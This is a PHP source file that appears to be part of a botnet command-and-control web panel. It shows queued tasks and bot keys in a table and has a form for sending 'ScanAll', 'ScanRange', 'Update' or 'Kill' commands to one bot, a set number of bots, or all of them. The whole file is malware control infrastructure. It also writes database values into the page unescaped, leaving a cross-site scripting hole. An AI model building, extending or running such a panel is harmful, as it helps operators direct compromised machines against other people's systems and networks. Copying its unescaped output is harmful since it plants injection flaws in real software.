<?php
	$select = $conn->prepare("SELECT * FROM tasks");
	$select->execute();

	$BOTTABLE = '<table id="BotTable">';
	$BOTTABLE .= '<tr>';
	$BOTTABLE .= '<th>ID</th>';
	$BOTTABLE .= '<th>Task</th>';
	$BOTTABLE .= '<th>Parameters</th>';
	$BOTTABLE .= '<th>User</th>';
	$BOTTABLE .= '<th>Count</th>';
	$BOTTABLE .= '<th>Botkey</th>';
	$BOTTABLE .=  '</tr>';

	while ($row = $select->fetch(PDO::FETCH_ASSOC))
	{
		$BOTTABLE .= '<tr>';
		$BOTTABLE .= '<td>' . $row['id'] . '</td>';
		$BOTTABLE .= '<td>' . $row['task'] . '</td>';
		if (is_null($row['parameters']) == true)
			$BOTTABLE .= '<td>' . 'NULL' . '</td>';
		else
			$BOTTABLE .= '<td>' . $row['parameters'] . '</td>';
		if ($_SESSION['admin'] == 1)
			$BOTTABLE .= '<td>' . $row['user'] . '</td>';
		else
			$BOTTABLE .= '<td>Permission Denied</td>';
		$BOTTABLE .= '<td>' . $row['count'] . '</td>';
		if (is_null($row['bkey']) == true)
			$BOTTABLE .= '<td>' . 'NULL' . '</td>';
		else
			$BOTTABLE .= '<td>' . $row['bkey'] . '</td>';
		$BOTTABLE .= '</tr>';
	}

	$BOTTABLE .= "</table>";
	echo $BOTTABLE;

	if (isset($_POST['cmdsubmit']))
	{
		if (!isset($_SESSION['username'])) // Do we need this to stop unathuthed posts?
			die();

		$cmdErr = "";
		$inserttask = 0;
		$key = $task = str_replace(" ", "", $_POST['key']);
		$task = $_POST['task'];
		$parameters = $_POST['parameter'];

		$task = str_replace(" ", "", $task);

		if (isInt($key) == true)
		{
			if ($key == 0)
			{
				$botsq = $conn->prepare("SELECT bot_id FROM bots WHERE bot_id>0");
				$botsq->execute();
				$key = $botsq->rowCount();
			}
			$count = $key;
			$key = NULL;
		}
		else
		{
			$count = 1;
			$search = $conn->prepare("SELECT * FROM bots WHERE bot_key = :key");
			$search->execute(array(
				':key'=>$key
        	));
			if ($search->rowCount() != 1)
				$cmdErr .= "Bot key invalid";
		}

		switch ($task)
		{
			case "ScanAll":
				$inserttask = 1;
				break;
			case "ScanRange":
				$inserttask = 2;
				break;
			case "Update":
				$inserttask = 3;
				break;
			case "Kill":
				$inserttask = 4;
				break;
			default:
				die(); // Why would you post this for no reason?
		}

		try
		{
			$taskq = $conn->prepare("INSERT INTO tasks (task, parameters, user, count, bkey) VALUES (:task, :param, :user, :count, :bkey)");
			$taskq->execute(array(
				":task"=>$inserttask,
				":param"=>$parameters, 
				":user"=>$_SESSION['username'],
				":count"=>$count,
				":bkey"=>$key
			));
		}
		catch(PDOException $e) {
			logx("Command insert error: ", $e->getMessage(), 1);
		}

	}
?>

<?php
	if (isset($cmdErr))
		echo '<div style="color:#FF0000;text-align:center;font-size:12px;">' . $cmdErr . '</div>';
?>
<form method="POST" action="" enctype="application/x-www-form-urlencoded">
	<div">
		<input type="text" class="form-control" placeholder="Key or bot count. (0 for all)" name="key" value="">
		<br><br>
		<div>
			<select name="task">
				<option>Scan All</option>
				<option>Scan Range</option>
				<option>Update</option>
				<option>Kill</option>
			</select>
			<br><br>
		<input type="text" class="form-control" placeholder="Parameter" name="parameter">
		</div>
	</div>
	<!-- <br> -->
	<input type="submit" name="cmdsubmit" value="Create">
</form>


<p>Scan All: </p>